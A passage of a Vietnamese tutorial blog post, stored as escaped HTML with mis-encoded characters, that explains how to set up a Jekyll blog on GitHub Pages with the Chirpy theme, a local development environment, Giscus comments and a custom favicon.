h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giscus&lt;/strong&gt;: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;T√†i kho·∫£n &lt;a href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Markdown&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;creating-a-site-repository&#34;&gt;&lt;span&gt;Creating a Site Repository&lt;/span&gt;&#xA;  &lt;a href=&#34;#creating-a-site-repository&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng &lt;a href=&#34;https://chirpy.cotes.page/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Chirpy themes&lt;/strong&gt;&lt;/a&gt;, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c b∆∞·ªõc th·ª±c hi·ªán&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p v√†o &lt;a href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt; v√† di chuy·ªÉn ƒë·∫øn &lt;a href=&#34;https://github.com/cotes2020/chirpy-starter&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;starter&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Thay v√¨ Fork, ta click &lt;kbd&gt;Use this template&lt;/kbd&gt; v√† ch·ªçn &lt;kbd&gt;Create a new repository&lt;/kbd&gt; ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t t√™n cho Repository m·ªõi &lt;code&gt;&amp;lt;username&amp;gt;.github.io&lt;/code&gt;, thay ƒë·ªïi &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; th√†nh Github username c·ªßa b·∫°n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setting-up-the-environment&#34;&gt;&lt;span&gt;Setting up the Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-the-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Sau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages.&lt;/li&gt;&#xA;&lt;li&gt;Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;using-dev-containers-recommended-for-windows&#34;&gt;&lt;span&gt;Using Dev Containers (Recommended for Windows)&lt;/span&gt;&#xA;  &lt;a href=&#34;#using-dev-containers-recommended-for-windows&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Dev Containers&lt;/strong&gt; cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c b∆∞·ªõc th·ª±c hi·ªán&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;C√†i ƒë·∫∑t Docker:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Tr√™n Windows/macOS: c√†i &lt;a href=&#34;https://www.docker.com/products/docker-desktop/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Desktop&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tr√™n Linux: c√†i &lt;a href=&#34;https://docs.docker.com/engine/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Engine&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;C√†i &lt;a href=&#34;https://code.visualstudio.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;VS Code&lt;/a&gt; v√† extension &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Dev Containers&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Clone repository:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-a-git-repository-or-github-pr-in-an-isolated-container-volume&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;clone repo trong container volume&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-an-existing-folder-in-a-container&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;m·ªü b·∫±ng container&lt;/a&gt; trong VS Code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setting-up-natively-recommended-for-unix-like-os&#34;&gt;&lt;span&gt;Setting up Natively (Recommended for Unix-like OS)&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-natively-recommended-for-unix-like-os&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c b∆∞·ªõc th·ª±c hi·ªán&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;L√†m theo &lt;a href=&#34;https://jekyllrb.com/docs/installation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll&lt;/a&gt; v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t &lt;a href=&#34;https://git-scm.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Git&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Clone repository v·ªÅ m√°y local.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu b·∫°n fork theme, c√†i &lt;a href=&#34;https://nodejs.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Node.js&lt;/a&gt; v√† ch·∫°y &lt;code&gt;bash tools/init.sh&lt;/code&gt; trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo.&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o &lt;code&gt;./vendor/bundle/&lt;/code&gt; trong project, kh√¥ng c·∫ßn &lt;strong&gt;sudo&lt;/strong&gt; v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn &lt;code&gt;/var/lib/gems..&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle config set --local path &amp;#39;vendor/bundle&amp;#39;&#xA;bundle install&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;usage&#34;&gt;&lt;span&gt;Usage&lt;/span&gt;&#xA;  &lt;a href=&#34;#usage&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;start-the-jekyll-server&#34;&gt;&lt;span&gt;Start the Jekyll Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#start-the-jekyll-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle exec jekyll s&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;configuration&#34;&gt;&lt;span&gt;Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong &lt;code&gt;_config.yml&lt;/code&gt;, bao g·ªìm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;lang&lt;/code&gt;: Set language cho website c·ªßa b·∫°n&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt;: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;title&lt;/code&gt;: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tagline&lt;/code&gt;: Subtitle, m√¥ t·∫£ trang web&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;avatar&lt;/code&gt;: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng &lt;code&gt;gif&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;comment-feature-via-giscus&#34;&gt;&lt;span&gt;Comment feature via Giscus&lt;/span&gt;&#xA;  &lt;a href=&#34;#comment-feature-via-giscus&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta s·ª≠ d·ª•ng &lt;a href=&#34;https://giscus.app&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Giscus&lt;/strong&gt;&lt;/a&gt; l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: &lt;a href=&#34;https://disqus.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Disqus&lt;/strong&gt;&lt;/a&gt;, &lt;a href=&#34;https://utteranc.es/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Utterances&lt;/strong&gt;&lt;/a&gt;, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c b∆∞·ªõc th·ª±c hi·ªán&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;C√†i ƒë·∫∑t &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; v√†o Github.&lt;/li&gt;&#xA;&lt;li&gt;V√†o &lt;strong&gt;Settings&lt;/strong&gt; c·ªßa repository ch·ªçn &lt;strong&gt;General&lt;/strong&gt; v√† b·∫≠t &lt;strong&gt;Discussions&lt;/strong&gt; ƒë·ªÉ giscus l∆∞u comments v√†o &lt;strong&gt;Discussions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nh·∫≠p repository &lt;code&gt;&amp;lt;username&amp;gt;/&amp;lt;username&amp;gt;.github.io&lt;/code&gt;, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website.&lt;/li&gt;&#xA;&lt;li&gt;C·∫•u h√¨nh giscus trong &lt;code&gt;_config.yml&lt;/code&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;provider&lt;/code&gt;: ch·ªçn giscus&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;giscus&lt;/code&gt;: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; v√†o bi·∫øn &lt;code&gt;giscus&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;customize-the-favicon&#34;&gt;&lt;span&gt;Customize the Favicon&lt;/span&gt;&#xA;  &lt;a href=&#34;#customize-the-favicon&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o &lt;strong&gt;favicon&lt;/strong&gt; ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng &lt;strong&gt;favicon&lt;/strong&gt; m·∫∑c ƒë·ªãnh c·ªßa themes&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c b∆∞·ªõc th·ª±c hi·ªán&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p &lt;a href=&#34;https://www.favicon-generator.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Favicon Genarate&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Click &lt;kbd&gt;Browse&lt;/kbd&gt; ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click &lt;kbd&gt;Create Favicon&lt;/kbd&gt; ƒë·ªÉ t·∫°o.&lt;/li&gt;&#xA;&lt;li&gt;Click &lt;code&gt;Download the generated favicon&lt;/code&gt; ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ.&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;browserconfig.xml&lt;/li&gt;&#xA;&lt;li&gt;site.webmanifest&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o &lt;code&gt;assets/img/favicons&lt;/code&gt;(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extends&#34;&gt;&lt;span&gt;Extends&lt;/span&gt;&#xA;  &lt;a 